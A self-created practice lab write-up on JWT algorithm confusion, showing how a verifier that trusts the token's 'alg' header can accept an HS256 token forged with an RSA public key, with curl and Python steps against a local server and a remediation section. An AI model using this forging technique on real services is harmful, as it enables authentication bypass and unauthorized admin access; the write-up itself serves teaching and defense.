# Practice Lab — JWT Algorithm Confusion

> **Self-created CTF-style practice scenario.** This is not an official CTF challenge and does not represent a real vulnerability, real target, or personal achievement.

## Challenge / Context

A small web application uses a JSON Web Token (JWT) to maintain an authenticated session. The application expects tokens signed with an asymmetric algorithm, but its verification logic trusts the algorithm value supplied in the token header.

The goal of this controlled lab is to understand how an algorithm-confusion flaw can turn a verification-key handling mistake into an authentication bypass.

## Reconnaissance

Start by authenticating normally and inspect the session cookie or `Authorization` header.

```bash
curl -i http://127.0.0.1:8000/login \
  -H 'Content-Type: application/json' \
  --data '{"username":"demo","password":"demo"}'
```

A JWT has three Base64URL-encoded sections:

```text
header.payload.signature
```

Decode the first two sections locally to inspect the claims:

```bash
python3 - <<'PY'
import base64, json

token = input('JWT: ').strip()
header, payload, _ = token.split('.')

for name, part in [('header', header), ('payload', payload)]:
    part += '=' * (-len(part) % 4)
    data = base64.urlsafe_b64decode(part)
    print(name + ':')
    print(json.dumps(json.loads(data), indent=2))
PY
```

The important observation in this practice scenario is that the header contains an algorithm identifier such as `RS256`, while the server-side verification routine uses the same configured key material regardless of the selected algorithm.

## Vulnerability / Technique

The weakness is **JWT algorithm confusion**.

A common vulnerable design is conceptually similar to:

```python
jwt.decode(token, verification_key, algorithms=[token_header["alg"]])
```

The verifier should not let an attacker choose the accepted algorithm. If an application expects an RSA-signed token (`RS256`) but can be induced to verify an HMAC token (`HS256`) using the RSA public key as the HMAC secret, the attacker may be able to create a token with modified claims.

This lab assumes the server intentionally contains that verification flaw.

## Solution Steps

### 1. Inspect the original token

Decode the JWT and record the existing claims. In the lab, the normal token represents a low-privileged user.

```bash
python3 - <<'PY'
import base64, json

token = input().strip()
header, payload, signature = token.split('.')

def dec(value):
    value += '=' * (-len(value) % 4)
    return json.loads(base64.urlsafe_b64decode(value))

print(dec(header))
print(dec(payload))
PY
```

### 2. Identify the verification mismatch

Review the lab application's JWT verification code. The vulnerable condition is that the algorithm is accepted from the untrusted token header instead of being fixed by server configuration.

The expected security model should be:

```python
jwt.decode(token, public_key, algorithms=["RS256"])
```

not an attacker-controlled algorithm list.

### 3. Construct the modified token

For the controlled lab, create a token whose payload changes the authorization claim from the normal user role to the lab's administrator role. The token header is changed to the algorithm expected by the vulnerable verifier's alternate code path.

A Python implementation can be used to reproduce the signing operation without storing any real credential or private key in the repository.

```python
import jwt

claims = {
    "sub": "demo",
    "role": "admin"
}

# Use only the disposable verification material supplied by the local lab.
forged = jwt.encode(claims, LAB_VERIFICATION_MATERIAL, algorithm="HS256")
print(forged)
```

### 4. Submit the modified token

Replace the lab session token with the generated value and request the protected endpoint:

```bash
curl -i http://127.0.0.1:8000/admin \
  -H "Authorization: Bearer $FORGED_TOKEN"
```

In the intentionally vulnerable lab, the application accepts the token because its verification logic incorrectly couples the attacker-controlled `alg` header to the key type.

## Result

The controlled practice scenario demonstrates an **authentication/authorization bypass caused by JWT algorithm confusion**. No real service, real credential, real flag, or production vulnerability is involved.

## Why the Attack Works

JWT signatures do not provide security by themselves; the verifier's algorithm and key-selection policy are part of the security boundary.

If the application:

1. trusts the token's `alg` value,
2. supports incompatible signing families,
3. and reuses key material incorrectly,

an attacker may be able to transform a valid token into a token that the vulnerable verifier accepts.

## Remediation

- Allow-list the expected JWT algorithm on the server.
- Do not derive verification policy from the untrusted JWT header.
- Keep asymmetric signing keys and symmetric secrets in separate key-management paths.
- Validate required claims such as `iss`, `aud`, `exp`, and authorization claims.
- Reject unexpected algorithms before cryptographic verification.
- Prefer well-maintained JWT libraries and follow their secure verification APIs.

Example:

```python
jwt.decode(
    token,
    public_key,
    algorithms=["RS256"],
    audience="practice-app",
    issuer="practice-app"
)
```

## Lessons Learned

- JWT header fields are attacker-controlled input.
- Signature verification must enforce the expected algorithm independently of the token.
- Key type and algorithm must be bound together by server-side policy.
- Authentication bugs often become authorization bugs when role claims are trusted without proper verification.
- Reviewing the actual verification code is more reliable than assuming a JWT is secure because it is signed.

**Lab classification:** Self-created practice content only.
